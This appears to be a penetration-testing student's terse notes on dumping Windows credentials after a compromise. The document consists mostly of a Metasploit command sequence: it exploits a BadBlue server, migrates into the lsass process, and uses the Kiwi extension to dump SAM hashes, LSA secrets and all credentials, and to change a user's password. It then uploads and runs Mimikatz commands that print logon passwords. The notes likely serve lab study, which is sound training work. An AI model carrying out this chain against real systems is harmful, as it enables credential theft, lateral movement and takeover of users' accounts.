post explotation  tool that lalows extration of clear text passwords hashes and kerberos tickets from ram
sam database is a database on windows that stores hashed passwords
mimikatz can extract hashes from the lsass.exe process where hashes are cached
can also use inbuilt meterpreter extension KIWI
requires elevated privs
search badblue


use  1 (badblue_passthru)
  set options
    exploit
      pgrep lsas #provides PID of LSAS
      migrate <lsas PID>
 load Kiwi
  ? #help
  lsa_dump_sam #dumps the lsa sam
  creds_all #retrieves all credentials
    windows versions 8.1 do not store clear text passwords
   lsa_dump_sam #dumps ntlm hash for each user
   lsa_dump_secrets #dumps secrets
   password_change #changes password/hash of a  user
cd C:\\
  mkdir Temp
    cd Temp
      upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
        shell 
          .\mimikatz.exe
            privilege::debug
            lsadump::sam
            lsadump::secrets
            sekurlsa::logonpasswords #displays all the logon passwords
            
